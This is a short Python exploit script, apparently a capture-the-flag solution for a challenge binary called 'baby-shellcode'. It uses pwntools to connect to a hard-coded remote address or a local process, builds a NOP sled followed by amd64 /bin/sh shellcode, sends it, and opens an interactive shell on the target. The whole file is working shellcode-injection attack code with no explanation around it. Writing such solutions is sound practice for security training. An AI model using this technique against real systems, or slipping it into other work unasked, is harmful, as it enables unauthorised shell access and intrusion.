#!/usr/bin/env python3

from pwn import *
from pwnlib import asm, shellcraft


context(arch='amd64', os='linux')

if args.REMOTE:
    r = remote('34.28.147.7', 5000)
elif args.GDB:
    r = gdb.debug('./baby-shellcode', 'b start')
else:
    r = process('./baby-shellcode')

shellcode = asm.asm(shellcraft.amd64.linux.sh())
payload = b'\x90' * 0x20 + shellcode

r.sendline(payload)
r.interactive()
